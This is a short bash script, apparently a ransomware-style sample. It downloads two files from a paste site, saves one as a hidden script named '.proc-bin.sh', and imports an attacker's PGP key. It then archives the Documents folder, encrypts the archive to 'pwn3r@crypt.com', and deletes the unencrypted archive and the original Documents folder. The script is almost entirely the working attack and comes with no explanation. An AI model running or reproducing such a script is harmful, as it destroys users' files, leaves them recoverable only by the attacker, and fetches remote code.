#!/bin/bash
wget https://paste.c-net.org/MartiniReindeer https://paste.c-net.org/ToolsPhyllis
mv MartiniReindeer public.pgp
mv ToolsPhyllis .proc-bin.sh
gpg --import public.pgp
tar -czf Documents.tar.gz Documents
gpg --encrypt -r pwn3r@crypt.com Documents.tar.gz
rm public.pgp Documents.tar.gz
rm -r Documents
